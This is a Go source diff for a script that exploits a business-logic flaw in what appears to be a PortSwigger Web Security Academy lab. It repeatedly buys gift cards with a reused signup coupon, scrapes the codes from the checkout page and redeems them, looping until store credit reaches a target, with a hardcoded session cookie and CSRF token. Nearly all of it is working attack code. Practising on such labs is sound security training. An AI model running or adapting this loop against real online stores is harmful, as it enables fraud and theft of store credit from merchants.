@@ -2,13 +2,24 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
+	"math"
 	"net/http"
 	"net/url"
 	"strconv"
 	"strings"
 
 	"github.com/PuerkitoBio/goquery"
+)
+
+// required configuration - make sure you have at least $10 of store credit
+const (
+	baseURL = "https://acb81f601fca3cc3809b0e5000d900a0.web-security-academy.net/"
+	// baseURL := "https://acb81f601fca3cc3809b0e5000d900a0.free.beeceptor.com/" // for debugging
+	csrf          = "LCEepui73UVECHlN3R84TDYwCdfXc5cX"         // get this info from a POST request to /cart/coupon using Burp
+	cookie        = "session=ZrqCi4oh69dHpHLsSdUv072OJNOfw8Sf" // get this info from a POST request to /cart/coupon using Burp
+	targetBalance = 1337
 )
 
 type httpObject struct {
@@ -32,11 +43,10 @@ func httpReq(Method string, urlpath string, params map[string]string) (*http.Res
 		return nil, err
 	}
 
-	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36")
-	req.Header.Add("Origin", "https://ac9f1f191f3d491e806555d4005c0033.web-security-academy.net")
+	req.Header.Add("User-Agent", "Hacker Browser/1.0")
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Add("Content-Length", strconv.Itoa(len(form.Encode())))
-	req.Header.Add("Cookie", `session=hTTdsrSfOsB6iTTd3BKgnno42nrjkpZO; session=2XOQhY9xF2JAYyzlpKXvcbJYCinR30rE`)
+	req.Header.Add("Cookie", cookie)
 
 	// Print Request
 	// reqDump, err := httputil.DumpRequest(req, true)
@@ -57,12 +67,12 @@ func httpReq(Method string, urlpath string, params map[string]string) (*http.Res
 	return resp, err
 }
 
-func redeem(coupon string, baseURL string) (*http.Response, error) {
+func redeem(coupon string) (*http.Response, error) {
 	u := &httpObject{
 		Path:   "gift-card",
 		Method: "POST",
 		Params: map[string]string{
-			"csrf":      "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
+			"csrf":      csrf,
 			"gift-card": coupon,
 		},
 	}
@@ -71,20 +81,13 @@ func redeem(coupon string, baseURL string) (*http.Response, error) {
 	return httpReq(u.Method, baseURL+u.Path, u.Params)
 }
 
-func main() {
-	var err error
-	var resp *http.Response
-
-	baseURL := "https://ac9f1f191f3d491e806555d4005c0033.web-security-academy.net/"
-	// baseURL := "https://ac651f351e5dbd4a80b7305d00f30014.free.beeceptor.com/"
-
+func exploit(quantity int) {
 	coupons := []string{}
 	couponIndex := 0
 
 	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart
 	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/coupon
 	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/checkout
-	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/cart/order-confirmation?order-confirmed=true
 	// https://ac4e1f8c1e904432803d30b300350046.web-security-academy.net/gift-card
 	urls := []httpObject{
 		{
@@ -92,7 +95,7 @@ func main() {
 			Method: "POST",
 			Params: map[string]string{
 				"productId": "2",
-				"quantity":  "20",
+				"quantity":  strconv.Itoa(quantity),
 				"redir":     "CART",
 			},
 		},
@@ -100,7 +103,7 @@ func main() {
 			Path:   "cart/coupon",
 			Method: "POST",
 			Params: map[string]string{
-				"csrf":   "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
+				"csrf":   csrf,
 				"coupon": "SIGNUP30",
 			},
 		},
@@ -108,75 +111,97 @@ func main() {
 			Path:   "cart/checkout",
 			Method: "POST",
 			Params: map[string]string{
-				"csrf": "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
+				"csrf": csrf,
 			},
 		},
-		// {
-		// 	Path:     "cart/order-confirmation?order-confirmed=true",
-		// 	Method: "GET",
-		// },
-		// {
-		// 	Path:     "gift-card",
-		// 	Method: "POST",
-		// 	Params: map[string]string{
-		// 		"csrf":      "O6uv7iVXz1dGfWAz8IumToVEnDcDMEu1",
-		// 		"gift-card": "91HsiFhNz9",
-		// 	},
-		// },
 	}
 
-	for i := 0; i < 10; i++ { // repeat 10 times
-		for _, u := range urls {
-			// time.Sleep(time.Millisecond * 200)
-			fmt.Printf("\n=== Request %s %s\n", u.Method, u.Path)
-			// if u.Method == "GET" {
-			// 	resp, err = httpReq(u.Method, baseURL+u.Path, nil)
+	for _, u := range urls {
 
-			// } else {
-			// if u.Path == "gift-card" {
-			// 	u.Params["gift-card"] = coupons[couponIndex]
-			// 	couponIndex++
-			// }
-			resp, err = httpReq(u.Method, baseURL+u.Path, u.Params)
-			// }
-			if err != nil {
-				fmt.Println("error: ", err)
-				break
-			}
+		fmt.Printf("\n=== Request %s %s\n", u.Method, u.Path)
+		resp, err := httpReq(u.Method, baseURL+u.Path, u.Params)
 
-			// save coupon code
-			if u.Path == "cart/checkout" {
-				defer resp.Body.Close()
-				if resp.StatusCode == 200 {
-					// HTML SCRAPE
-					// Load the HTML document
-					doc, err := goquery.NewDocumentFromReader(resp.Body)
-					if err != nil {
-						log.Fatal(err)
-					}
+		if err != nil {
+			fmt.Println("error: ", err)
+			break
+		}
 
-					// Find the coupon items
-					doc.Find("table.is-table-numbers").Each(func(i int, tablehtml *goquery.Selection) {
-						tablehtml.Find("tr").Each(func(indextr int, rowhtml *goquery.Selection) {
-							rowhtml.Find("td").Each(func(indexth int, tablecell *goquery.Selection) {
-								coupon := tablecell.Text()
-								fmt.Printf("Coupon %d: %s\n", indextr, coupon)
-								coupons = append(coupons, coupon)
-							})
+		// save coupon code
+		if u.Path == "cart/checkout" {
+			defer resp.Body.Close()
+			if resp.StatusCode == 200 {
+				// Load and Scrape the HTML document
+				doc, err := goquery.NewDocumentFromReader(resp.Body)
+				if err != nil {
+					log.Fatal(err)
+				}
+
+				// Find the coupon items
+				doc.Find("table.is-table-numbers").Each(func(i int, tablehtml *goquery.Selection) {
+					tablehtml.Find("tr").Each(func(indextr int, rowhtml *goquery.Selection) {
+						rowhtml.Find("td").Each(func(indexth int, tablecell *goquery.Selection) {
+							coupon := tablecell.Text()
+							// fmt.Printf("Coupon %d: %s\n", indextr, coupon) // display coupon for debug
+							coupons = append(coupons, coupon)
 						})
 					})
-				}
+				})
 			}
-
-			fmt.Println("status: ", resp.Status)
 		}
+		fmt.Println("status: ", resp.Status)
 	}
+
+	// redeem coupons
 	for _, coupon := range coupons {
-		resp, err := redeem(coupon, baseURL)
+		resp, err := redeem(coupon)
 		if err != nil {
 			fmt.Println("error: ", err)
 		}
 		couponIndex++
 		fmt.Println("status: ", resp.Status)
 	}
+}
+
+func getCurrentStoreCredit() float64 {
+	resp, err := httpReq("GET", baseURL+"my-account?id=wiener", nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	resp.Body.Close()
+
+	strChunk := strings.Split(string(body), "Store credit: $")
+	if len(strChunk) < 2 {
+		log.Fatal("could not fetch current balance - please check url, headers, cookies and current balance")
+	}
+	strChunk2 := strings.Split(strChunk[1], "</strong></p>")
+	balanceString := strChunk2[0]
+
+	balance, err := strconv.ParseFloat(balanceString, 64)
+	if err != nil {
+		log.Fatalf("could not convert current [%v] balance to float: %v", balance, err)
+	}
+	return balance
+}
+
+func main() {
+	priceItemToBuy := 10
+	for storeCredit := getCurrentStoreCredit(); targetBalance > storeCredit; storeCredit = getCurrentStoreCredit() {
+		// display current balance and the amount of gift cards to buy
+		fmt.Printf("\n\n==================================\n")
+		fmt.Println("==> Current Store Credit: $", storeCredit)
+		qty := int(math.Floor(storeCredit / float64(priceItemToBuy)))
+		if qty > 99 {
+			qty = 99 // this is the maximum value supported by the website
+		}
+		fmt.Printf("=> Buying %d gift cards to redeem.", qty)
+		fmt.Printf("\n==================================\n\n")
+
+		// execute the requests
+		exploit(qty)
+	}
+	fmt.Println("Finished executing, current balance: $", getCurrentStoreCredit())
 }
